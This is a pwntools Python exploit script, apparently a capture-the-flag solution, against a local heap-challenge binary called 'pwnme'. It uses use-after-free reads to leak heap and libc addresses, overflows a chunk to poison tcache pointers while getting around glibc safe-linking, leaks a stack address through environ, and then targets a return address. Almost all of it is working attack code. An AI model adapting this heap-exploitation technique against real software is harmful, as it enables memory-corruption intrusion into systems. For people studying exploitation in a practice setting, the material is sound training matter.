from pwn import *

# Set up pwntools for the correct architecture
exe = "./pwnme"
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = False    
libc = ELF("./libc.so.6")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    set max-visualize-chunk-size 0x500
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()
def rls(a): return r.recvlines(a)

def new(ind, size, cont):
    sl(b"1")
    sl(str(ind).encode())
    sl(str(size).encode())
    sl(cont)
    ru(b"chunk addresses.")

def delete(ind):
    sl(b"2")
    sl(str(ind).encode())
    ru(b"chunk addresses.")

def edit(ind, cont):
    sl(b"3")
    sl(str(ind).encode())
    sl(cont)
    ru(b"chunk addresses.")

def view(ind):
    sl(b"4")
    sl(str(ind).encode())
    ru(b"chunk addresses.")

def protptr(addr, val):
    return (addr>>12 ^ val)

r = start()
# r = remote("", )

new(0, 0x600, b"george")
new(1, 0x18, b"lmao")
new(2, 0x600, b"george2")
new(3, 0x18, b"lmao2")

delete(0)
delete(1)
delete(2)
delete(3)

view(2)
ru(b"which index?\n> ")
heap = u64(re(6).ljust(8, b"\x00"))-656

log.info(f"{hex(heap)}")

view(0)
ru(b"which index?\n> ")
libc.address = u64(re(6).ljust(8, b"\x00"))-2043072

log.info(f"{hex(libc.address)}")

new(0, 0x600, b"did this work? ")
new(1, 0x600, b"did this work? 2")

edit(1, b"A"*(0x600+8) + p64(0x31) + p64(protptr(heap+3824, libc.sym.environ)))
log.info(f"{hex(libc.sym.environ)}")

new(2, 0x18, b"babu")
new(3, 0, b"")

view(3)
ru(b"which index?\n> ")
stack = u64(re(6).ljust(8, b"\x00"))
log.info(f"{hex(stack)}")

ret = stack - 336
new(4, 0x48, "new1")
new(5, 0x48, "new2")

delete(5)
delete(4)

edit(2, b"A"*24 + p64(0x51) + p64(protptr(heap+3840, ret-8)))



r.interactive()

'''
- You can delete chunk which is not there.
Safe linking:
#define PROTECT_PTR(pos, ptr) ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
'''